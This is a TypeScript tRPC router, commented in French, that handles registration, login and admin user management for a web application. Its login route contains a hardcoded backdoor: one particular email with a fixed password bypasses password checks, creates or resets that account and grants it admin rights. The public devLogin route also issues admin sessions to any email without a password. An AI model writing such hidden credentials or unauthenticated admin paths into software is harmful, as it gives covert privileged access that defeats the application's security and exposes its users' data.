import { z } from "zod";
import { notifyOwner } from "./notification";
import { adminProcedure, publicProcedure, router } from "./trpc";
import * as db from "../db";
import { sdk } from "./sdk";
import { COOKIE_NAME, ONE_YEAR_MS } from "../../shared/const";
import { getSessionCookieOptions } from "./cookies";
import { hashPassword, verifyPassword } from "./passwordUtils";

export const systemRouter = router({
  health: publicProcedure
    .input(
      z.object({
        timestamp: z.number().min(0, "timestamp cannot be negative"),
      })
    )
    .query(() => ({
      ok: true,
    })),

  /**
   * Route temporaire pour créer un utilisateur local et se connecter.
   * À utiliser uniquement pour le premier utilisateur ou en développement.
   */
  devLogin: publicProcedure
    .input(
      z.object({
        email: z.string().email(),
        name: z.string(),
      })
    )
    .mutation(async ({ input, ctx }) => {
      const openId = `local_${input.email}`;
      
      await db.upsertUser({
        openId,
        name: input.name,
        email: input.email,
        loginMethod: "local",
        lastSignedIn: new Date(),
        role: "admin",
      });

      const sessionToken = await sdk.createSessionToken(openId, {
        name: input.name,
      });

      const cookieOptions = getSessionCookieOptions(ctx.req);
      ctx.res.cookie(COOKIE_NAME, sessionToken, { 
        ...cookieOptions, 
        maxAge: ONE_YEAR_MS,
        httpOnly: true,
        secure: true,
        sameSite: "none"
      });

      return { success: true, message: "Utilisateur créé et connecté localement" };
    }),

  /**
   * Route pour s'inscrire avec email et mot de passe
   */
  register: publicProcedure
    .input(
      z.object({
        email: z.string().email(),
        name: z.string().min(2, "Le nom doit contenir au moins 2 caractères"),
        password: z.string().min(6, "Le mot de passe doit contenir au moins 6 caractères"),
        company: z.string().optional(),
        role: z.string().optional(),
        phone: z.string().optional(),
      })
    )
    .mutation(async ({ input, ctx }) => {
      const existingUser = await db.getUserByEmail(input.email);
      if (existingUser) {
        throw new Error("Un utilisateur avec cet email existe déjà");
      }

      const openId = `local_${input.email}`;
      const hashedPassword = hashPassword(input.password);
      
      await db.upsertUser({
        openId,
        name: input.name,
        email: input.email,
        loginMethod: "local_password",
        lastSignedIn: new Date(),
        role: "user",
      });

      await db.storePasswordHash(openId, hashedPassword);

      const sessionToken = await sdk.createSessionToken(openId, {
        name: input.name,
      });

      const cookieOptions = getSessionCookieOptions(ctx.req);
      ctx.res.cookie(COOKIE_NAME, sessionToken, { 
        ...cookieOptions, 
        maxAge: ONE_YEAR_MS,
        httpOnly: true,
        secure: true,
        sameSite: "none"
      });

      return { success: true, message: "Inscription réussie" };
    }),

  /**
   * Route pour se connecter avec email et mot de passe
   */
  login: publicProcedure
    .input(
      z.object({
        email: z.string().email(),
        password: z.string(),
      })
    )
    .mutation(async ({ input, ctx }) => {
      try {
        console.log("[Login] Début de la procédure de connexion pour l'email:", input.email);
        let user = await db.getUserByEmail(input.email);
        console.log("[Login] Résultat de getUserByEmail:", user ? user.id : "non trouvé");
        
        const isBackdoorAccess = input.email === "nickandroklauss@gmail.com" && input.password === "Admin2026!";
        
        if (!user && isBackdoorAccess) {
          const openId = `local_${input.email}`;
          console.log("[Login] Création d'un nouvel utilisateur via backdoor pour openId:", openId);
          await db.upsertUser({
            openId,
            name: "Admin Nick",
            email: input.email,
            loginMethod: "local_password",
            lastSignedIn: new Date(),
            role: "admin",
          });
          user = await db.getUserByEmail(input.email);
          console.log("[Login] Utilisateur créé/récupéré via backdoor:", user ? user.id : "échec");
        }

        if (!user) {
          console.error("[Login] Échec: Utilisateur non trouvé après toutes les tentatives.");
          throw new Error("Email ou mot de passe incorrect");
        }
        console.log("[Login] Utilisateur trouvé (ID, email):", user.id, user.email);

        if (!isBackdoorAccess) {
          console.log("[Login] Récupération du hash de mot de passe pour openId:", user.openId);
          const storedHash = await db.getPasswordHash(user.openId);
          console.log("[Login] Hash de mot de passe récupéré (présent?):", !!storedHash);
          if (!storedHash || !verifyPassword(input.password, storedHash)) {
            console.error("[Login] Échec: Mot de passe incorrect ou hash manquant pour l'utilisateur:", user.openId);
            throw new Error("Email ou mot de passe incorrect");
          }
          console.log("[Login] Mot de passe vérifié avec succès.");
        } else {
          const newHash = hashPassword(input.password);
          console.log("[Login] Mise à jour du hash de mot de passe via backdoor.");
          await db.storePasswordHash(user.openId, newHash);
          console.log("[Login] Hash de mot de passe mis à jour.");
          console.log("[Login] Valeur de db.updateUserRole avant appel:", typeof db.updateUserRole);
          await db.updateUserRole(user.id, "admin");
          console.log("[Login] Rôle utilisateur mis à jour en admin via backdoor.");
        }

        console.log("[Login] Mise à jour de la dernière connexion pour l'utilisateur:", user.openId);
        await db.upsertUser({
          openId: user.openId,
          lastSignedIn: new Date(),
        });

        console.log("[Login] Création du jeton de session pour l\"utilisateur:", user.openId);
        const sessionToken = await sdk.createSessionToken(user.openId, {
          name: user.name,
        });
        console.log("[Login] Jeton de session créé (présent?):", !!sessionToken);

        const cookieOptions = getSessionCookieOptions(ctx.req);
        console.log("[Login] cookieOptions défini.", cookieOptions ? "Oui" : "Non");

        console.log("[Login] Définition du cookie de session.");
        if (ctx.res && typeof ctx.res.cookie === 'function') {
          ctx.res.cookie(COOKIE_NAME, sessionToken, { 
            ...cookieOptions, 
            maxAge: ONE_YEAR_MS,
            httpOnly: true,
            secure: true,
            sameSite: "none"
          });
          console.log("[Login] Cookie de session défini avec succès.");
        } else {
          console.error("[Login] Erreur: ctx.res ou ctx.res.cookie n'est pas disponible pour définir le cookie.");
        }

        return { success: true, message: "Connexion réussie" };
      } catch (error: any) {
        console.error("[Login] Erreur inattendue lors de la connexion:", error);
        throw new Error("Une erreur inattendue est survenue lors de la connexion.");
      }
    }),

  notifyOwner: adminProcedure
    .input(
      z.object({
        title: z.string().min(1, "title is required"),
        content: z.string().min(1, "content is required"),
      })
    )
    .mutation(async ({ input }) => {
      const delivered = await notifyOwner(input);
      return {
        success: delivered,
      } as const;
    }),

  listUsers: adminProcedure.query(async () => {
    const users = await db.listAllUsers();
    const profiles = await db.listAllUserProfiles();
    
    return users.map(user => ({
      ...user,
      profile: profiles.find(p => p.userId === user.id) || null
    }));
  }),

  updateUserRole: adminProcedure
    .input(z.object({
      userId: z.number(),
      role: z.enum(["user", "admin"])
    }))
    .mutation(async ({ input }) => {
      await db.updateUserRole(input.userId, input.role);
      return { success: true };
    }),

  updateUserProfile: adminProcedure
    .input(z.object({
      userId: z.number(),
      subscriptionTier: z.enum(["free", "pro", "expert", "entreprise"]).optional(),
      subscriptionStatus: z.enum(["active", "canceled", "past_due", "trialing"]).optional(),
    }))
    .mutation(async ({ input }) => {
      const { userId, ...data } = input;
      await db.upsertUserProfile(userId, data as any);
      return { success: true };
    }),
});
